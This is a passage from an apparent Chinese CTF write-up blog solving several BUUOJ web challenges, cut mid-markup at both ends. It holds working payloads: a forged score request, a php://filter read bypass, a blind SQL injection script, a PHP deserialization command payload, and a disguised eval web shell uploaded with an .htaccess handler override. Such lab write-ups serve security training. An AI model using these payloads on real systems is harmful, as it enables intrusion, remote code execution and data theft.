class="token function">open</span><span class="token punctuation">(</span><span class="token string">"POST"</span><span class="token punctuation">,</span> <span class="token string">"/api.php"</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="5"></td><td><pre>        xhr<span class="token punctuation">.</span><span class="token function">setRequestHeader</span><span class="token punctuation">(</span><span class="token string">"Content-Type"</span><span class="token punctuation">,</span> <span class="token string">"application/json"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="6"></td><td><pre>        xhr<span class="token punctuation">.</span><span class="token function-variable function">onreadystatechange</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="7"></td><td><pre>        <span class="token keyword">if</span> <span class="token punctuation">(</span>xhr<span class="token punctuation">.</span>readyState <span class="token operator">===</span> <span class="token number">4</span> <span class="token operator">&amp;&amp;</span> xhr<span class="token punctuation">.</span>status <span class="token operator">===</span> <span class="token number">200</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="8"></td><td><pre>            <span class="token keyword">var</span> response <span class="token operator">=</span> <span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">parse</span><span class="token punctuation">(</span>xhr<span class="token punctuation">.</span>responseText<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="9"></td><td><pre>            <span class="token function">alert</span><span class="token punctuation">(</span>response<span class="token punctuation">.</span>message<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="10"></td><td><pre>        <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="11"></td><td><pre>        <span class="token punctuation">&#125;</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="12"></td><td><pre>        <span class="token keyword">var</span> data <span class="token operator">=</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="13"></td><td><pre>            <span class="token literal-property property">score</span><span class="token operator">:</span> gameScore<span class="token punctuation">,</span></pre></td></tr><tr><td data-num="14"></td><td><pre>        <span class="token punctuation">&#125;</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="15"></td><td><pre>        xhr<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">stringify</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="16"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="17"></td><td><pre>	<span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">"成绩："</span><span class="token operator">+</span>gameScore<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="18"></td><td><pre>	gameScore<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>  </pre></td></tr><tr><td data-num="19"></td><td><pre>	curPhase <span class="token operator">=</span><span class="token constant">PHASE_READY</span><span class="token punctuation">;</span>  </pre></td></tr><tr><td data-num="20"></td><td><pre>	hero <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="21"></td><td><pre>	hero <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Hero</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  	    </pre></td></tr><tr><td data-num="22"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr></table></figure><p>可以看到当分数大于 10w 分时，会向 /api.php 发送一个 json 数据包，json 内容如下：</p><p score:gamescore=""></p><p>大体意思就是这样，向 /api.php 发送一个 post 请求，要求 gamescore&gt;100000 即可。</p><p>细细分析这串代码是这样子的：</p><p>利用：var xhr = new XMLHttpRequest (); 创建一个 XMLHttpRequest 对象（ <code>xhr</code> ）用于向服务器发送 HTTP 请求。</p><p>使用 POST 方法将请求发送到 &quot;/api.php&quot; 的 URL。</p><p>设置请求头的 Content-Type 为 &quot;application/json&quot;，表示请求的数据将以 JSON 格式发送。</p><p>设置 <code>xhr</code> 对象的 <code>onreadystatechange</code> 事件处理程序，以便在请求状态改变时执行特定的操作。</p><p>创建一个包含游戏分数的 JavaScript 对象（ <code>data</code> ），然后将其转换为 JSON 格式并通过 <code>xhr.send</code> 方法发送给服务器。</p><p>然后，无论游戏分数是否大于 100,000，都会执行以下操作：</p><ul><li>弹出一个包含游戏分数的警告框，显示游戏得分（ <code>gameScore</code> ）。</li><li>将 <code>gameScore</code> 重置为 0，为了准备下一轮游戏。</li><li>重置 <code>curPhase</code> 为 <code>PHASE_READY</code> ，将游戏状态设置为准备状态。</li><li>创建一个新的 <code>hero</code> 对象</li></ul><p>关于 xhr.readyState 是这样的：</p><figure class="highlight plaintext"><figcaption data-lang="plaintext"></figcaption><table><tr><td data-num="1"></td><td><pre>xhr.readyState 是 XMLHttpRequest 对象的属性，用于表示当前请求的状态。它的值会在不同阶段的请求过程中发生变化，帮助开发人员监控和处理请求的进度。xhr.readyState 可能的取值如下：</pre></td></tr><tr><td data-num="2"></td><td><pre></pre></td></tr><tr><td data-num="3"></td><td><pre>0（UNSENT）：初始化状态。XMLHttpRequest 对象已经创建，但尚未调用 open 方法。</pre></td></tr><tr><td data-num="4"></td><td><pre></pre></td></tr><tr><td data-num="5"></td><td><pre>1（OPENED）：打开状态。open 方法已经被调用，但尚未调用 send 方法。</pre></td></tr><tr><td data-num="6"></td><td><pre></pre></td></tr><tr><td data-num="7"></td><td><pre>2（HEADERS_RECEIVED）：接收响应头状态。send 方法已经被调用，响应头已经接收。</pre></td></tr><tr><td data-num="8"></td><td><pre></pre></td></tr><tr><td data-num="9"></td><td><pre>3（LOADING）：正在接收响应数据。正在接收响应数据，但尚未完成。</pre></td></tr><tr><td data-num="10"></td><td><pre></pre></td></tr><tr><td data-num="11"></td><td><pre>4（DONE）：完成状态。整个请求过程已完成，包括接收和处理响应数据。</pre></td></tr><tr><td data-num="12"></td><td><pre>通常，在处理 XMLHttpRequest 时，开发人员会关注 xhr.readyState 的值，特别是当它变为 4 时，表示请求已经完成，可以安全地处理响应数据。这通常与 xhr.status 结合使用，以确定请求是否成功完成。</pre></td></tr></table></figure><p>关于 <code>JSON.stringify(data)</code></p><blockquote><p>它是 JavaScript 中的一个函数，用于将一个 JavaScript 对象或值转换为 JSON 格式的字符串。JSON（JavaScript Object Notation）是一种用于数据交换的轻量级文本格式，通常用于在不同应用程序之间传递数据。</p><p>当你传递一个 JavaScript 对象给 <code>JSON.stringify()</code> 函数时，它会将该对象序列化为一个 JSON 字符串，以便可以在网络中传输、存储到文件中，或者用于其他数据交换的场合。这个函数的语法如下：</p><pre><code>javascriptCopy code
JSON.stringify(value[, replacer[, space]])
</code></pre><ul><li><code>value</code> : 要转换为 JSON 字符串的值（通常是一个 JavaScript 对象）。</li><li><code>replacer</code> （可选）：一个函数或数组，用于控制如何筛选或转换对象的属性。如果不需要筛选或转换属性，可以将其设置为 <code>null</code> 。</li><li><code>space</code> （可选）：一个用于缩进输出的字符串或数字，可选项，用于美化生成的 JSON 字符串。通常用于格式化输出。</li></ul></blockquote><p>理解了代码后，发包：</p><figure class="highlight http"><figcaption data-lang="HTTP"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token request-line"><span class="token method property">POST</span> <span class="token request-target url">/api.php</span> <span class="token http-version property">HTTP/1.1</span></span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token header"><span class="token header-name keyword">Host</span><span class="token punctuation">:</span> <span class="token header-value">b76621da-9478-4b38-816d-21bfa26d009a.node4.buuoj.cn:81</span></span></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token header"><span class="token header-name keyword">Cache-Control</span><span class="token punctuation">:</span> <span class="token header-value">max-age=0</span></span></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token header"><span class="token header-name keyword">Upgrade-Insecure-Requests</span><span class="token punctuation">:</span> <span class="token header-value">1</span></span></pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token header"><span class="token header-name keyword">User-Agent</span><span class="token punctuation">:</span> <span class="token header-value">Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36</span></span></pre></td></tr><tr><td data-num="6"></td><td><pre><span class="token header"><span class="token header-name keyword">Accept</span><span class="token punctuation">:</span> <span class="token header-value">text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span></span></pre></td></tr><tr><td data-num="7"></td><td><pre><span class="token header"><span class="token header-name keyword">Accept-Encoding</span><span class="token punctuation">:</span> <span class="token header-value">gzip, deflate</span></span></pre></td></tr><tr><td data-num="8"></td><td><pre><span class="token header"><span class="token header-name keyword">Accept-Language</span><span class="token punctuation">:</span> <span class="token header-value">zh-CN,zh;q=0.9</span></span></pre></td></tr><tr><td data-num="9"></td><td><pre><span class="token header"><span class="token header-name keyword">Content-Type</span><span class="token punctuation">:</span> <span class="token header-value">application/json</span></span></pre></td></tr><tr><td data-num="10"></td><td><pre><span class="token application-json"></span></pre></td></tr><tr><td data-num="11"></td><td><pre><span class="token punctuation">&#123;</span><span class="token string-property property">"score"</span> <span class="token operator">:</span> <span class="token number">100000</span><span class="token punctuation">&#125;</span></pre></td></tr></table></figure><p>得到响应包：</p><figure class="highlight http"><figcaption data-lang="HTTP"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token response-status"><span class="token http-version property">HTTP/1.1</span> <span class="token status-code number">200</span> <span class="token reason-phrase string">OK</span></span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token header"><span class="token header-name keyword">Server</span><span class="token punctuation">:</span> <span class="token header-value">openresty</span></span></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token header"><span class="token header-name keyword">Date</span><span class="token punctuation">:</span> <span class="token header-value">Tue, 07 Nov 2023 12:27:40 GMT</span></span></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token header"><span class="token header-name keyword">Content-Type</span><span class="token punctuation">:</span> <span class="token header-value">text/html; charset=utf-8</span></span></pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token header"><span class="token header-name keyword">Connection</span><span class="token punctuation">:</span> <span class="token header-value">keep-alive</span></span></pre></td></tr><tr><td data-num="6"></td><td><pre><span class="token header"><span class="token header-name keyword">X-Powered-By</span><span class="token punctuation">:</span> <span class="token header-value">PHP/7.3.15</span></span></pre></td></tr><tr><td data-num="7"></td><td><pre><span class="token header"><span class="token header-name keyword">Content-Length</span><span class="token punctuation">:</span> <span class="token header-value">58</span></span></pre></td></tr><tr><td data-num="8"></td><td><pre></pre></td></tr><tr><td data-num="9"></td><td><pre>&#123;"message":"flag&#123;f7aa0a86-95fb-469e-9fba-a3c309b69e16&#125;\n"&#125;</pre></td></tr></table></figure><p>或者可以设置断点，来修改 score。</p><h3 id="include-0-0"><a class="anchor" href="#include-0-0">#</a> include 0。0</h3><p>进入题目给出源码：</p><figure class="highlight php"><figcaption data-lang="PHP"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token php language-php"><span class="token delimiter important">&lt;?php</span></span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token comment">// FLAG in the flag.php</span></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token variable">$file</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/base|rot/i'</span><span class="token punctuation">,</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="6"></td><td><pre>    @<span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="7"></td><td><pre><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="8"></td><td><pre>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"nope"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="9"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="10"></td><td><pre><span class="token delimiter important">?></span> nope</pre></td></tr></table></figure><p>需要读取 flag.php 文件，读取 php 文件需要使用 php://filter 伪协议中的过滤器，常见的就是 base64 编码，但这里过滤了 base 和 rot</p><p>但是没有关系，可以用其他过滤器，比如 convert.iconv 系列过滤器。</p><p>具体可以参考这篇文章：</p><p><span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0NjU3ODk5L2FydGljbGUvZGV0YWlscy8xMDkzMDAzMzU=">php://filter 的各种过滤器</span></p><p>payload:</p><blockquote><p>?file=php://filter/convert.iconv.UTF-8.UTF-16/resource=flag.php</p></blockquote><h3 id="ez_sql"><a class="anchor" href="#ez_sql">#</a> ez_sql</h3><p>union 注入题，使用大小写就可以绕过，为了之后方便，我直接写了一个盲注脚本：</p><figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">import</span> requests</pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token keyword">import</span> urllib</pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token keyword">import</span> string</pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token keyword">import</span> time</pre></td></tr><tr><td data-num="5"></td><td><pre></pre></td></tr><tr><td data-num="6"></td><td><pre>session <span class="token operator">=</span> requests<span class="token punctuation">.</span>session<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="7"></td><td><pre>flag <span class="token operator">=</span> <span class="token string">''</span></pre></td></tr><tr><td data-num="8"></td><td><pre>burp0_url <span class="token operator">=</span> <span class="token string">"http://4eee49a9-7a7b-4891-933b-27c782f49044.node4.buuoj.cn:81/"</span></pre></td></tr><tr><td data-num="9"></td><td><pre><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">50</span><span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="10"></td><td><pre>    <span class="token keyword">for</span> j <span class="token keyword">in</span> string<span class="token punctuation">.</span>printable<span class="token punctuation">:</span></pre></td></tr><tr><td data-num="11"></td><td><pre>        <span class="token comment">#url = burp0_url + "?id=TMP1589' And Ascii(Substr(database(),&#123;&#125;,1)) = &#123;&#125;%23".format(i, ord(j))</span></pre></td></tr><tr><td data-num="12"></td><td><pre>        <span class="token comment">#url = burp0_url + "?id=TMP1589' And Ascii(Substr((Select table_name From INFOrmation_schema.tables Where table_schema='ctf' limit 1,1),&#123;&#125;,1))=&#123;&#125;%23".format(i, ord(j))</span></pre></td></tr><tr><td data-num="13"></td><td><pre>        <span class="token comment">#here_is_flag</span></pre></td></tr><tr><td data-num="14"></td><td><pre>        <span class="token comment">#url = burp0_url + "?id=TMP1589' And Ascii(Substr((Select column_name From INFOrmation_schema.columns Where table_schema='ctf' And table_name='here_is_flag' limit 0,1),&#123;&#125;,1))=&#123;&#125;%23".format(i, ord(j))</span></pre></td></tr><tr><td data-num="15"></td><td><pre>        url <span class="token operator">=</span> burp0_url <span class="token operator">+</span> <span class="token string">"?id=TMP1589' And Ascii(Substr((Select flag From here_is_flag),&#123;&#125;,1))=&#123;&#125;%23"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span> <span class="token builtin">ord</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="16"></td><td><pre>        r <span class="token operator">=</span> session<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="17"></td><td><pre>        <span class="token keyword">if</span> <span class="token string">"id: TMP1589"</span> <span class="token keyword">in</span> r<span class="token punctuation">.</span>text<span class="token punctuation">:</span></pre></td></tr><tr><td data-num="18"></td><td><pre>            flag <span class="token operator">+=</span> j</pre></td></tr><tr><td data-num="19"></td><td><pre>            <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="20"></td><td><pre>            <span class="token keyword">break</span></pre></td></tr><tr><td data-num="21"></td><td><pre>        <span class="token keyword">else</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="22"></td><td><pre>            time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">0.1</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="23"></td><td><pre>            <span class="token keyword">continue</span></pre></td></tr></table></figure><h3 id="unserialize"><a class="anchor" href="#unserialize">#</a> Unserialize？</h3><figure class="highlight php"><figcaption data-lang="PHP"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token php language-php"><span class="token delimiter important">&lt;?php</span></span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token comment">// Maybe you need learn some knowledge about deserialize?</span></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token keyword">class</span> <span class="token class-name-definition class-name">evil</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="5"></td><td><pre>    <span class="token keyword">private</span> <span class="token variable">$cmd</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="6"></td><td><pre></pre></td></tr><tr><td data-num="7"></td><td><pre>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="8"></td><td><pre>    <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="9"></td><td><pre>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/cat|tac|more|tail|base/i"</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">cmd</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="10"></td><td><pre>            @<span class="token function">system</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">cmd</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="11"></td><td><pre>        <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="12"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="13"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="14"></td><td><pre></pre></td></tr><tr><td data-num="15"></td><td><pre>@<span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'unser'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="16"></td><td><pre><span class="token delimiter important">?></span></pre></td></tr></table></figure><p>简单的反序列化题，对 rce 的过滤也很简单，</p><p>使用 '\'、单引号绕过，或者用其他文件查看命令即可。</p><figure class="highlight php"><figcaption data-lang="PHP"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token php language-php"><span class="token delimiter important">&lt;?php</span></span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token keyword">class</span> <span class="token class-name-definition class-name">evil</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="3"></td><td><pre>    <span class="token keyword">private</span> <span class="token variable">$cmd</span><span class="token operator">=</span><span class="token string double-quoted-string">"c\at /th1s_1s_fffflllll4444aaaggggg"</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token variable">$a</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">evil</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="6"></td><td><pre><span class="token keyword">echo</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr></table></figure><blockquote><p>unser=O%3A4%3A%22evil%22%3A1%3A%7Bs%3A9%3A%22%00evil%00cmd%22%3Bs%3A35%3A%22c%5Cat+%2Fth1s_1s_fffflllll4444aaaggggg%22%3B%7D</p></blockquote><h3 id="upload-again"><a class="anchor" href="#upload-again">#</a> Upload again!</h3><p>本题的考点是绕过后端对后缀名的限制，apache 解析漏洞，绕过对文件内容的检测。</p><p>文件内容禁止使用 &lt;?，用下面的一句话木马绕过：</p><figure class="highlight http"><figcaption data-lang="HTTP"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token request-line"><span class="token method property">POST</span> <span class="token request-target url">/</span> <span class="token http-version property">HTTP/1.1</span></span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token header"><span class="token header-name keyword">Host</span><span class="token punctuation">:</span> <span class="token header-value">8c9b9a93-c631-4894-af5a-9cdfa624d16a.node4.buuoj.cn:81</span></span></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token header"><span class="token header-name keyword">Upgrade-Insecure-Requests</span><span class="token punctuation">:</span> <span class="token header-value">1</span></span></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token header"><span class="token header-name keyword">User-Agent</span><span class="token punctuation">:</span> <span class="token header-value">Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36</span></span></pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token header"><span class="token header-name keyword">Referer</span><span class="token punctuation">:</span> <span class="token header-value">http://8c9b9a93-c631-4894-af5a-9cdfa624d16a.node4.buuoj.cn:81/</span></span></pre></td></tr><tr><td data-num="6"></td><td><pre><span class="token header"><span class="token header-name keyword">Accept-Encoding</span><span class="token punctuation">:</span> <span class="token header-value">gzip, deflate</span></span></pre></td></tr><tr><td data-num="7"></td><td><pre><span class="token header"><span class="token header-name keyword">Accept-Language</span><span class="token punctuation">:</span> <span class="token header-value">zh-CN,zh;q=0.9</span></span></pre></td></tr><tr><td data-num="8"></td><td><pre><span class="token header"><span class="token header-name keyword">Origin</span><span class="token punctuation">:</span> <span class="token header-value">http://8c9b9a93-c631-4894-af5a-9cdfa624d16a.node4.buuoj.cn:81</span></span></pre></td></tr><tr><td data-num="9"></td><td><pre><span class="token header"><span class="token header-name keyword">Accept</span><span class="token punctuation">:</span> <span class="token header-value">text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span></span></pre></td></tr><tr><td data-num="10"></td><td><pre><span class="token header"><span class="token header-name keyword">Cache-Control</span><span class="token punctuation">:</span> <span class="token header-value">max-age=0</span></span></pre></td></tr><tr><td data-num="11"></td><td><pre><span class="token header"><span class="token header-name keyword">Content-Type</span><span class="token punctuation">:</span> <span class="token header-value">multipart/form-data; boundary=----WebKitFormBoundaryx6o4VHZ4XDm5n0AN</span></span></pre></td></tr><tr><td data-num="12"></td><td><pre><span class="token header"><span class="token header-name keyword">Content-Length</span><span class="token punctuation">:</span> <span class="token header-value">366</span></span></pre></td></tr><tr><td data-num="13"></td><td><pre></pre></td></tr><tr><td data-num="14"></td><td><pre>------WebKitFormBoundaryx6o4VHZ4XDm5n0AN</pre></td></tr><tr><td data-num="15"></td><td><pre><span class="token header"><span class="token header-name keyword">Content-Disposition</span><span class="token punctuation">:</span> <span class="token header-value">form-data; name="file"; filename="6.jpg"</span></span></pre></td></tr><tr><td data-num="16"></td><td><pre><span class="token header"><span class="token header-name keyword">Content-Type</span><span class="token punctuation">:</span> <span class="token header-value">image/jpeg</span></span></pre></td></tr><tr><td data-num="17"></td><td><pre></pre></td></tr><tr><td data-num="18"></td><td><pre>GIF89a?</pre></td></tr><tr><td data-num="19"></td><td><pre>&lt;script language="php">@eval($_POST['cmd']);&lt;/script></pre></td></tr><tr><td data-num="20"></td><td><pre></pre></td></tr><tr><td data-num="21"></td><td><pre>------WebKitFormBoundaryx6o4VHZ4XDm5n0AN</pre></td></tr><tr><td data-num="22"></td><td><pre><span class="token header"><span class="token header-name keyword">Content-Disposition</span><span class="token punctuation">:</span> <span class="token header-value">form-data; name="submit"</span></span></pre></td></tr><tr><td data-num="23"></td><td><pre></pre></td></tr><tr><td data-num="24"></td><td><pre>Upload!!!</pre></td></tr><tr><td data-num="25"></td><td><pre>------WebKitFormBoundaryx6o4VHZ4XDm5n0AN--</pre></td></tr></table></figure><p>然后再上传.htaccess 文件，让服务器把.jpg 文件当成 php 文件解析：</p><figure class="highlight http"><figcaption data-lang="HTTP"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token request-line"><span class="token method property">POST</span> <span class="token request-target url">/</span> <span class="token http-version property">HTTP/1.1</span></span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token header"><span class="token header-name keyword">Host</span><span class="token punctuation">:</span> <span class="token header-value">8c9b9a93-c631-4894-af5a-9cdfa624d16a.node4.buuoj.cn:81</span></span></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token header"><span class="token header-name keyword">Accept-Encoding</span><span class="token punctuation">:</span> <span class="token header-value">gzip, deflate</span></span></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token header"><span class="token header-name keyword">Cache-Control</span><span class="token punctuation">:</span> <span class="token header-value">max-age=0</span></span></pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token header"><span class="token header-name keyword">Content-Type</span><span class="token punctuation">:</span> <span class="token header-value">multipart/form-data; boundary=----WebKitFormBoundaryIkVx38g5yCKcBpoo</span></span></pre></td></tr><tr><td data-num="6"></td><td><pre><span class="token header"><span class="token header-name keyword">Accept</span><span class="token punctuation">:</span> <span class="token header-value">text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span></span></pre></td></tr><tr><td data-num="7"></td><td><pre><span class="token header"><span class="token header-name keyword">User-Agent</span><span class="token punctuation">:</span> <span class="token header-value">Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36</span></span></pre></td></tr><tr><td data-num="8"></td><td><pre><span class="token header"><span class="token header-name keyword">Referer</span><span class="token punctuation">:</span> <span class="token header-value">http://8c9b9a93-c631-4894-af5a-9cdfa624d16a.node4.buuoj.cn:81/</span></span></pre></td></tr><tr><td data-num="9"></td><td><pre><span class="token header"><span class="token header-name keyword">Accept-Language</span><span class="token punctuation">:</span> <span class="token header-value">zh-CN,zh;q=0.9</span></span></pre></td></tr><tr><td data-num="10"></td><td><pre><span class="token header"><span class="token header-name keyword">Upgrade-Insecure-Requests</span><span class="token punctuation">:</span> <span class="token header-value">1</span></span></pre></td></tr><tr><td data-num="11"></td><td><pre><span class="token header"><span class="token header-name keyword">Origin</span><span class="token punctuation">:</span> <span class="token header-value">http://8c9b9a93-c631-4894-af5a-9cdfa624d16a.node4.buuoj.cn:81</span></span></pre></td></tr><tr><td data-num="12"></td><td><pre><span class="token header"><span class="token header-name keyword">Content-Length</span><span class="token punctuation">:</span> <span class="token header-value">470</span></span></pre></td></tr><tr><td data-num="13"></td><td><pre></pre></td></tr><tr><td data-num="14"></td><td><pre>------WebKitFormBoundaryIkVx38g5yCKcBpoo</pre></td></tr><tr><td data-num="15"></td><td><pre><span class="token header"><span class="token header-name keyword">Content-Disposition</span><span class="token punctuation">:</span> <span class="token header-value">form-data; name="file"; filename=".htaccess"</span></span></pre></td></tr><tr><td data-num="16"></td><td><pre><span class="token header"><span class="token header-name keyword">Content-Type</span><span class="token punctuation">:</span> <span class="token header-value">application/octet-stream</span></span></pre></td></tr><tr><td data-num="17"></td><td><pre></pre></td></tr><tr><td data-num="18"></td><td><pre>AddType application/x-httpd-php .php .jpg .png .gif </pre></td></tr><tr><td data-num="19"></td><td><pre>SetHandler application/x-httpd-php</pre></td></tr><tr><td data-num="20"></td><td><pre>php_value auto_append_fi\</pre></td></tr><tr><td data-num="21"></td><td><pre>le "php://filter/convert.base64-decode/resource=6.jpg"</pre></td></tr><tr><td data-num="22"></td><td><pre>------WebKitFormBoundaryIkVx38g5yCKcBpoo</pre></td></tr><tr><td data-num="23"></td><td><pre><span class="token header"><span class="token header-name keyword">Content-Disposition</span><span class="token punctuation">:</span> <span class="token header-value">form-data; name="submit"</span></span></pre></td></tr><tr><td data-num="24"></td><td><pre></pre></td></tr><tr><td data-num="25"></td><td><pre>Upload!!!</pre></td></tr><tr><td 